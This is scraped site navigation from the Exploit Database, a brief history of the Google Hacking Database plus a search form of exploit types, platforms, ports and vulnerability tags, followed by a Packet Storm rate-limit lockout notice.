After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from packetstormsecurity.com_2c87e2a5_20250119_121038.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

LOCKED OUT⛔ 24 hour lockout initiated

hi. we regret to inform you that a condition has occurred that has resulted in a 24 hour lockout. this occurs when rate limiting controls are exceeded or when someone attempts to hack the system but fails too many times. we wish you luck in your future attempts tomorrow.
